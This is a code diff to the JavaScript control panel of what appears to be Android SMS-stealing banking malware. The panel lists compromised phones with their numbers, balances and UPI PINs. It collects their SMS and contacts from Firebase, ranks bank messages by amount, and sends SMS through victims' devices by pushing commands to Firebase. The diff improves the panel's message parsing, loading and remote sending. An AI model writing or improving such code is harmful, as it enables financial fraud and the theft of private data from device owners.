@@ -303,10 +303,22 @@ function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').
 function escAttr(s){return String(s||'').replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
 function getRawDev(id){return clientsRawMap[id]||{};}
 function parseApkBool(v){
-  if(v===true||v==='true'||v==='1')return true;
-  if(v===false||v==='false'||v==='0')return false;
-  if(typeof v==='string')return v.toLowerCase()==='true';
+  if(v===true||v===1)return true;
+  if(v===false||v===0)return false;
+  if(v==null||v==='')return false;
+  var s=String(v).trim().toLowerCase();
+  if(s==='true'||s==='1'||s==='online'||s==='yes')return true;
+  if(s==='false'||s==='0'||s==='offline'||s==='no')return false;
   return false;
+}
+function deviceOnlineFromRaw(s,fbId){
+  if(!s)return false;
+  if(s.status!==undefined&&s.status!==null&&String(s.status)!==''){
+    if(parseApkBool(s.status))return true;
+    var sl=String(s.status).toLowerCase();
+    if(s.status===false||sl==='false'||sl==='0'||sl==='offline')return false;
+  }
+  return resolveOnlineStatus(s,fbId);
 }
 function isApkYes(v){return String(v||'').toLowerCase()==='yes';}
 function hasApkModelName(raw){return !!(raw&&raw.modelName!=null&&String(raw.modelName).trim());}
@@ -396,7 +408,8 @@ function showPage(view){
   });
   updatePanelTitles();
   if(currentView==='money'){
-    loadMoneyMessages().then(function(){renderMoneyView();updateStats();});
+    moneyMessagesList=[];
+    loadMoneyMessages(true).then(function(){renderMoneyView();updateStats();});
   }else if(currentView==='device'){
     renderDeviceDetail();
     renderDeviceSmsList();
@@ -584,13 +597,13 @@ function deviceHasPin(d){
 }
 function deviceMatchesApkFilter(d,view){
   var raw=getRawDev(d.id);
-  if(view==='online'||devFilterMode==='online')return hasApkModelName(raw)&&isApkOnlineRaw(raw);
-  if(view==='onlypin'||devFilterMode==='pin'){
-    if(!raw||!Object.prototype.hasOwnProperty.call(raw,'upipin'))return false;
-    return !!String(raw.upipin||'').trim();
-  }
+  if(view==='online'||devFilterMode==='online')return d.status==='online';
+  if(view==='onlypin'||devFilterMode==='pin')return deviceHasPin(d);
   if(view==='liked'||devFilterMode==='liked')return isApkYes(raw.liked);
-  if(view==='login'||devFilterMode==='login')return hasApkModelName(raw)&&isApkYes(raw.login);
+  if(view==='login'||devFilterMode==='login'){
+    if(isApkYes(raw.login))return true;
+    return hasApkModelName(raw)&&isApkYes(raw.login);
+  }
   return true;
 }
 function getFilteredDevs(){
@@ -1116,7 +1129,7 @@ function processClientsDataNow(){
   allDevs=[];
   Object.keys(clientsRawMap).forEach(function(k){
     var s=clientsRawMap[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
-    var on=hasApkModelName(s)?isApkOnlineRaw(s):resolveOnlineStatus(s,p.fbId);
+    var on=deviceOnlineFromRaw(s,p.fbId);
     var contacts=s.contacts||extractContactsFromRecord(s);
     var smsIdx=inst&&inst.smsIndex&&inst.smsIndex[p.devId];
     var hasSms=!!(smsIdx&&smsIdx.roots&&smsIdx.roots.length);
@@ -1248,7 +1261,7 @@ function scanAllDevicesBank(){
 
 function buildDevCardHtml(d,i,total){
   var raw=getRawDev(d.id);
-  var on=hasApkModelName(raw)?isApkOnlineRaw(raw):(d.status==='online');
+  var on=d.status==='online';
   var phone=getApkMobNo(raw,d);
   var info='Phone : '+esc(phone)+'\nModel : '+esc(getApkModel(raw,d))+'\nBattery : '+(raw.battery!=null?raw.battery:d.battery)+'%\n$- : '+esc(getApkMoney(raw));
   var pinLine='PIN = '+esc(getApkUpiPin(raw)||'—');
@@ -1267,7 +1280,7 @@ function buildSmsCardHtml(m,extra,opts){
   opts=opts||{};
   var body=esc(m.body||m.message||m.text||'');
   var sender=esc(m.address||m.sender||m.from||'Unknown');
-  var when=esc(m.date_readable||m.dateTime||m.date||'');
+  var when=esc(m.date_readable||m.dateTime||m.date||m.time||'');
   var meta=(extra?esc(extra)+' · ':'')+'Sender: '+sender+(when?' · '+when:'');
   var del='';
   if(opts.deletable&&m.id){
@@ -1317,9 +1330,11 @@ function apkFormatMsgDate(ts){
 }
 function parseApkMoneyMessage(msgData,clientKey,clientData){
   if(!msgData||typeof msgData!=='object')return null;
-  if(msgData.message==null||msgData.sender==null)return null;
-  var message=String(msgData.message).toLowerCase();
-  var sender=String(msgData.sender).toLowerCase();
+  var msgText=msgData.message!=null?msgData.message:(msgData.body||msgData.text||'');
+  var senderRaw=msgData.sender!=null?msgData.sender:(msgData.address||msgData.from||'');
+  if(msgText==null||msgText===''||senderRaw==null||senderRaw==='')return null;
+  var message=String(msgText).toLowerCase();
+  var sender=String(senderRaw).toLowerCase();
   if(/\d{6,}/.test(sender))return null;
   if(/sbi|hdfc/.test(message))return null;
   if(/loan|application|emi/.test(message))return null;
@@ -1328,44 +1343,64 @@ function parseApkMoneyMessage(msgData,clientKey,clientData){
   if(!hit||!apkContainsLargeAmount(message))return null;
   var amount=apkExtractFirstAmount(message);
   var row=Object.assign({},msgData);
+  row.message=String(msgText);
+  row.sender=String(senderRaw);
   row.clientKey=clientKey;
   row.status=clientData&&clientData.status;
   row.modelName=clientData&&clientData.modelName;
   row.mobNo=clientData&&clientData.mobNo;
   row.amount=amount;
-  row.dateTime=msgData.dateTime||apkFormatMsgDate(msgData.timestamp||msgData.time||msgData.date);
+  var orig=msgData.dateTime||msgData.date_readable||msgData.date||msgData.time||'';
+  row.dateTime=orig?String(orig):'';
   return row;
 }
-function loadMoneyMessages(){
-  if(moneyMessagesLoading&&moneyMessagesList.length)return Promise.resolve(moneyMessagesList);
+function loadMoneyMessages(force){
+  if(moneyMessagesLoading)return new Promise(function(resolve){
+    var t=setInterval(function(){
+      if(!moneyMessagesLoading){clearInterval(t);resolve(moneyMessagesList);}
+    },150);
+  });
+  if(!force&&moneyMessagesList.length)return Promise.resolve(moneyMessagesList);
   moneyMessagesLoading=true;
   var insts=activeFbId?[getFbInstance(activeFbId)].filter(Boolean):firebaseInstances.slice();
-  var out=[], tasks=[];
-  insts.forEach(function(inst){
-    if(!inst)return;
-    tasks.push(restJsonInst(inst,'clients').then(function(clients){
-      if(!clients||typeof clients!=='object')return;
-      Object.keys(clients).forEach(function(clientKey){
-        var clientData=clients[clientKey];
-        if(!clientData||typeof clientData!=='object')return;
-        if(!hasApkModelName(clientData))return;
-        tasks.push(restJsonInst(inst,'messages/'+clientKey).then(function(msgs){
-          if(!msgs||typeof msgs!=='object')return;
-          Object.keys(msgs).forEach(function(msgId){
-            var parsed=parseApkMoneyMessage(Object.assign({id:msgId,fbId:inst.id},msgs[msgId]),clientKey,clientData);
-            if(parsed)parsed.fbId=inst.id;
-            if(parsed)out.push(parsed);
-          });
-        }).catch(function(){}));
+  function fetchClientMessages(inst,clientKey,clientData){
+    return restJsonInst(inst,'messages/'+clientKey).then(function(msgs){
+      if(!msgs||typeof msgs!=='object')return [];
+      var rows=[];
+      Object.keys(msgs).forEach(function(msgId){
+        var parsed=parseApkMoneyMessage(Object.assign({id:msgId},msgs[msgId]),clientKey,clientData);
+        if(parsed){parsed.fbId=inst.id;rows.push(parsed);}
       });
-    }).catch(function(){}));
-  });
-  return Promise.all(tasks).then(function(){
+      return rows;
+    }).catch(function(){return[];});
+  }
+  function loadInst(inst){
+    return restJsonInst(inst,'clients').then(function(clients){
+      if(!clients||typeof clients!=='object')return [];
+      var keys=Object.keys(clients);
+      return keys.reduce(function(chain,clientKey){
+        return chain.then(function(acc){
+          var clientData=clients[clientKey];
+          if(!clientData||typeof clientData!=='object')return acc;
+          if(!hasApkModelName(clientData))return acc;
+          return fetchClientMessages(inst,clientKey,clientData).then(function(rows){
+            return acc.concat(rows);
+          });
+        });
+      },Promise.resolve([]));
+    }).catch(function(){return[];});
+  }
+  return Promise.all(insts.map(loadInst)).then(function(results){
+    var out=[];
+    results.forEach(function(part){out=out.concat(part);});
     out.sort(function(a,b){return (b.amount||0)-(a.amount||0);});
     moneyMessagesList=out;
     moneyMessagesLoading=false;
     return out;
-  }).catch(function(){moneyMessagesLoading=false;return out;});
+  }).catch(function(){
+    moneyMessagesLoading=false;
+    return moneyMessagesList;
+  });
 }
 function buildMoneyCardHtml(row){
   var on=parseApkBool(row.status);
@@ -1402,14 +1437,17 @@ function renderMoneyView(){
     return hay.toLowerCase().includes(q);
   });
   setText('moneyTotal','Total:-'+list.length);
-  if(moneyMessagesLoading&&!list.length){
+  if(moneyMessagesLoading){
     el.innerHTML='<div class="empty">Loading money SMS…</div>';
-    loadMoneyMessages().then(function(){renderMoneyView();});
+    return;
+  }
+  if(!moneyMessagesList.length){
+    el.innerHTML='<div class="empty">Loading money SMS…</div>';
+    loadMoneyMessages(true).then(function(){renderMoneyView();});
     return;
   }
   if(!list.length){
     el.innerHTML='<div class="empty">No money messages found</div>';
-    if(!moneyMessagesList.length)loadMoneyMessages().then(function(){renderMoneyView();});
     return;
   }
   el.innerHTML=list.slice(0,200).map(buildMoneyCardHtml).join('');
@@ -1425,7 +1463,7 @@ function formatApkSimInfo(raw){
 }
 function buildDeviceDetailText(d){
   var raw=getRawDev(d.id);
-  var on=hasApkModelName(raw)?isApkOnlineRaw(raw):(d.status==='online');
+  var on=d.status==='online';
   var lines=[
     'Device name: '+getApkModel(raw,d),
     'Phone: '+getApkMobNo(raw,d),
@@ -1453,7 +1491,7 @@ function renderDeviceDetail(){
     return;
   }
   var raw=getRawDev(d.id);
-  var on=hasApkModelName(raw)?isApkOnlineRaw(raw):(d.status==='online');
+  var on=d.status==='online';
   if(titleEl)titleEl.textContent=getApkMobNo(raw,d)||getApkModel(raw,d)||'Device';
   if(statusEl){
     statusEl.textContent=on?'Online':'Offline';
@@ -1545,14 +1583,15 @@ function sendDeviceSms(sim){
   _sendSimSlot=sim||1;
   var toEl=document.getElementById('smsTo');
   var msgEl=document.getElementById('smsBody');
-  var to=normalizePhone((toEl&&toEl.value||'').trim());
+  var toRaw=(toEl&&toEl.value||'').trim();
+  var to=normalizePhone(toRaw)||toRaw;
   var msg=(msgEl&&msgEl.value||'').trim();
-  if(!to||to.length<10){toast('Enter valid 10-digit number',false);return;}
+  if(!toRaw){toast('Enter recipient phone number',false);return;}
   if(!msg){toast('Enter message',false);return;}
   if(_sendInFlight){toast('Sending…',true);return;}
   _sendInFlight=true;
   toast('Sending SMS…',true);
-  sendSmsInstant(to,msg,_sendSimSlot,function(ok,data){
+  sendSmsInstant(toRaw||to,msg,_sendSimSlot,function(ok,data){
     _sendInFlight=false;
     if(ok){
       if(msgEl)msgEl.value='';
@@ -2016,13 +2055,18 @@ function smsAsList(raw){
   for(w=0;w<wrapKeys.length;w++){
     if(raw[wrapKeys[w]]&&typeof raw[wrapKeys[w]]==='object')return smsAsList(raw[wrapKeys[w]]);
   }
-  return Object.keys(raw).map(function(k){return raw[k];}).filter(function(x){
-    return x&&typeof x==='object';
-  }).reduce(function(acc,v){
-    if(smsLooksLikeMessage(v))acc.push(v);
-    else acc=acc.concat(smsAsList(v));
-    return acc;
-  },[]);
+  return Object.keys(raw).map(function(k){
+    var v=raw[k];
+    if(!v||typeof v!=='object')return null;
+    if(smsLooksLikeMessage(v))return v.id?v:Object.assign({},v,{id:k});
+    return null;
+  }).filter(Boolean).concat(
+    Object.keys(raw).reduce(function(acc,k){
+      var v=raw[k];
+      if(v&&typeof v==='object'&&!smsLooksLikeMessage(v))acc=acc.concat(smsAsList(v));
+      return acc;
+    },[])
+  );
 }
 // ---- FIX: SMS timestamp extraction and sorting ----
 function smsToMs(v){
@@ -2048,17 +2092,42 @@ function smsMsgTime(m){
   var sk=smsToMs(m._sortKey);if(sk)return sk;
   return smsToMs(m.date_readable);
 }
-function normalizeSms(m){
+function smsDisplayTime(m){
+  if(!m)return '—';
+  var keys=['dateTime','date_readable','date_time','time','date','received_at','sent_at'];
+  var i,v;
+  for(i=0;i<keys.length;i++){
+    v=m[keys[i]];
+    if(v==null||v==='')continue;
+    if(typeof v==='string'&&String(v).trim())return String(v).trim();
+  }
+  return '—';
+}
+function normalizeSms(m,keyId){
   if(!m||typeof m!=='object')return null;
   if(isSmsCommandRecord(m)||isOutboundSmsCommand(m))return null;
   var body=String(m.body||m.message||m.text||m.content||m.msg||'').trim();
   if(!body)return null;
   if(!m.body&&m.message&&m.to&&m.status&&!m.sender)return null;
   var ts=smsMsgTime(m);
+  var display=smsDisplayTime(m);
+  if(display==='—'&&ts){
+    var dt=new Date(ts);
+    if(!isNaN(dt.getTime())){
+      var dd=String(dt.getDate()).padStart(2,'0'),mm=String(dt.getMonth()+1).padStart(2,'0'),yyyy=dt.getFullYear();
+      var h=dt.getHours(),mi=String(dt.getMinutes()).padStart(2,'0'),ap=h>=12?'pm':'am';
+      h=h%12||12;
+      display=dd+'/'+mm+'/'+yyyy+' | '+h+':'+mi+' '+ap;
+    }
+  }
   return{
+    id:m.id||keyId||m._key||'',
     address:m.address||m.sender||m.from||m.number||m.originatingAddress||'?',
     body:body,
-    date_readable:m.date_readable||m.dateTime||m.date_time||m.time||m.date||'—',
+    message:body,
+    sender:m.sender||m.address||m.from||'',
+    date_readable:display,
+    dateTime:m.dateTime||m.date_readable||m.date||'',
     type:String(m.type||m.direction||m.sms_type||'inbox').toLowerCase(),
     ts:ts
   };
@@ -2108,15 +2177,16 @@ function selectSim(slot,btn){
 
 // ---- Send SMS — instant Firebase direct + REST fallback ----
 function buildRabelSendPayload(sim,to,message){
-  return{from:sim||1,to:to,message:message,isSended:false};
+  return{from:sim||1,to:String(to||'').trim(),message:message,isSended:false};
 }
 function buildRto9SendPayload(deviceId,sim,to,message){
   var slot=Math.max(0,(sim||1)-1);
+  var toVal=String(to||'').trim();
   return{
     cmd:'send_sms',command:'send message',messageText:message,msg:message,
-    phoneNumber:to,to:to,
-    sendSms:{message:message,status:'pending',to:to},
-    sms:{message:message,status:'pending',to:to},
+    phoneNumber:toVal,to:toVal,
+    sendSms:{message:message,status:'pending',to:toVal},
+    sms:{message:message,status:'pending',to:toVal},
     sim:slot,simSlot:String(slot),
     targetDeviceId:deviceId,
     timestamp:Date.now(),
@@ -2125,15 +2195,18 @@ function buildRto9SendPayload(deviceId,sim,to,message){
 }
 function getSendAttempts(inst,d,to,message,sim){
   var id=d.rawId,out=[],rto,rabel;
+  var toFull=String(to||'').trim();
+  rabel=buildRabelSendPayload(sim,toFull,message);
+  out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:rabel});
   if(isRtoStyleUrl(inst.restUrl)||isRabelPanel(inst)){
-    rto=buildRto9SendPayload(id,sim,to,message);
+    rto=buildRto9SendPayload(id,sim,toFull,message);
     out.push({path:'clients/'+id,payload:rto});
     out.push({path:id,payload:rto});
-    rabel=buildRabelSendPayload(sim,to,message);
+    rabel=buildRabelSendPayload(sim,toFull,message);
     out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:rabel});
     out.push({path:id+'/webhookEvent/sendSms',payload:rabel});
   }else{
-    out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:buildRabelSendPayload(sim,to,message)});
+    out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:buildRabelSendPayload(sim,toFull,message)});
   }
   return out;
 }
@@ -2231,13 +2304,14 @@ function sendSmsInstant(to,msg,simSlot,callback){
   var d=getSelDev();
   var inst=getFbInstance(d&&d.fbId);
   if(!d||!inst){if(callback)callback(false,{error:'No device'});return;}
-  var phone=normalizePhone(to);
-  var attempts=getSendAttempts(inst,d,phone,msg,simSlot||1);
+  var phoneFull=String(to||'').trim();
+  var phone=normalizePhone(phoneFull)||phoneFull;
+  var attempts=getSendAttempts(inst,d,phoneFull||phone,msg,simSlot||1);
   var tasks=[];
   if(inst.db)tasks.push(sendSmsDirectFirebase(inst,attempts));
   tasks.push(sendSmsViaRest(inst,attempts));
   tasks.push(sendSmsFetch({
-    device_id:d.rawId,to:phone,message:msg,sim:simSlot||1,
+    device_id:d.rawId,to:phoneFull||phone,message:msg,sim:simSlot||1,
     database_url:inst.restUrl,auth_key:getFbAuthKey(inst),
     schema:inst.schema||'rabel',device_node:d.deviceNode||'clients',composite_id:d.id
   }).then(function(res){
@@ -2245,9 +2319,9 @@ function sendSmsInstant(to,msg,simSlot,callback){
     throw new Error((res.data&&res.data.error)||'PHP send failed');
   }));
   promiseAny(tasks).then(function(r){
-    if(callback)callback(true,{ok:true,message:'SMS sent instantly'+(r.via?' via '+r.via:''),path:r.path});
+    if(callback)callback(true,{ok:true,message:'SMS sent'+(r.via?' via '+r.via:''),path:r.path});
   }).catch(function(){
-    if(callback)callback(false,{error:'Send failed — device offline?'});
+    if(callback)callback(false,{error:'Send failed — check device online & Firebase auth'});
   });
 }
 function sendSmsInternal(to, msg, simSlot, callback){
